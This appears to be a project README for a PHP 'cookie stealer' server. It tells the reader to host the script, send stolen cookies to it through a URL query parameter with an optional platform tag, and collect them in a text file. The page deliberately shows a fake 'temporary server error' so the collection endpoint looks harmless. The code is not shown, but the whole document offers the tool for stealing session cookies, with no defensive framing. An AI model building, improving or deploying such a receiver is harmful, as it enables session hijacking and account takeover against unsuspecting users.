# Simple Cookie Stealer Server
Simple Cookie Stealer Server Built On PHP

**NOTE**
Unfortunately, It Is Not Database Integrated, It Just Writes The Data To Txt File.
I Also Have Node.js Version Of This (You Can Find It On My Github Profile)

Usage;
```
Host It Somewhere (vps, shared hosting, etc.)
Usage Is Gonna Be: yourdomain.com/cookiestealer.php?cookie=smth
When You Enter This File You Will See That We Now Have A File Called cookies.txt
Its Content Is Gonna Be Somehing Like: [UNKNOWN] smth
And The Website Output Is Something Like Temperoary Server Error, Don't Worry You Don't Have Any Problems With Your Hosting, I Just Made It Because Otherwise It Looks Suspicious.
```

Also, I added new feature And It Is platform selection
What Does This Do?
```
Lets Say You're Gonna Use This Server For Multiple Platforms Or Stuff
Then Platform Function Is Here For You!
Btw, This Feature Is Optional, You May Not Use it If you don't want to
Usage; yourdomain.com/cookiestealer.php?cookie=smth&platform=github
Output; [github] smth
```

Have A Nice Day, Thanks For Checking Out My Project
